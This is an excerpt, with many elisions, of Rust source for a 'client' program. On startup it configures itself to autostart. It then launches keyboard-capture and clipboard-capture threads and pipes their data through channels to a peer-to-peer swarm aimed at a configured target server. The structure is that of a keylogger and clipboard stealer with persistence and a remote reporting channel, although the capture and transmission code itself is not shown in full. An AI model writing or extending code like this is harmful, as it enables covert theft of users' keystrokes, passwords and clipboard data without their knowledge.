...
async fn bridge_std_to_tokio<T: Send + 'static>(
    ...
    tokio::task::spawn_blocking(move || {
        for data in std_rx { // Iterates until the std::sync::mpsc::Sender is dropped
        ...
        tracing::info!("Bridge {}: Standard MPSC channel ({}) closed by sender dropping. Bridge task ending.", channel_name, channel_name);
...
async fn main() -> Result<(), AppError> {
    let settings = match Settings::new() {
        Ok(s) => s,
        Err(e) => {
            eprintln!("FATAL: Client Configuration error: {}. Ensure 'client_settings.toml' exists and is valid.", e);
    ...
    tracing::debug!("Client Loaded settings. Target Server Peer ID: '{}'", settings.server_peer_id);
    tracing::debug!("Client Bootstrap addresses: {:?}", settings.bootstrap_addresses);


    if let Err(e) = system_utils::startup::setup_autostart(&settings) {
        tracing::warn!("Client: Failed to setup autostart: {}. Continuing execution...", e);
    }
    ...
    let kbd_monitor_thread_handle = core_monitors::keyboard_capture::start_keyboard_monitoring(raw_kb_std_tx)?;
    tracing::info!("Client: Keyboard monitor thread started.");
    
    let clip_monitor_thread_handle = core_monitors::clipboard_capture::start_clipboard_monitoring(raw_clip_std_tx, Arc::clone(&settings))?;
    ...
    let (swarm_command_tx_for_sender, swarm_command_rx_for_manager) = mpsc::channel::<SwarmCommand>(32); 
    ...
    #[cfg(windows)]
    let mut interrupt_signal_stream = signal::windows::ctrl_c().expect("Client: Failed to listen for Ctrl-C");
    #[cfg(unix)]
    let mut interrupt_signal_stream = signal::unix::signal(signal::unix::SignalKind::interrupt()).expect("Client: Failed to install SIGINT handler");
    ...
    if shutdown_tx.send(true).is_err() { // This signals all subscribers
        tracing::warn!("Client: Failed to send shutdown signal (all receivers dropped). Tasks might have already terminated.");
    }

    tracing::info!("Client: Waiting for application logic tasks to complete shutdown (timeout 10s)...");
    for (i, task_handle) in app_logic_tasks.into_iter().enumerate() { // Consumes the vec
        match tokio::time::timeout(Duration::from_secs(10), task_handle).await {
            Ok(Ok(Ok(_))) => tracing::debug!("Client: Application task {} completed successfully during shutdown.", i),
            Ok(Ok(Err(e))) => tracing::error!("Client: Application task {} completed with error during shutdown: {}", i, e),
            Ok(Err(e)) => tracing::error!("Client: Application task {} panicked or was cancelled during shutdown: {}", i, e),
    ...
    tracing::debug!("Client: Keyboard monitor thread handle: {:?}", kbd_monitor_thread_handle.thread().id());
    tracing::debug!("Client: Clipboard monitor thread handle: {:?}", clip_monitor_thread_handle.thread().id());
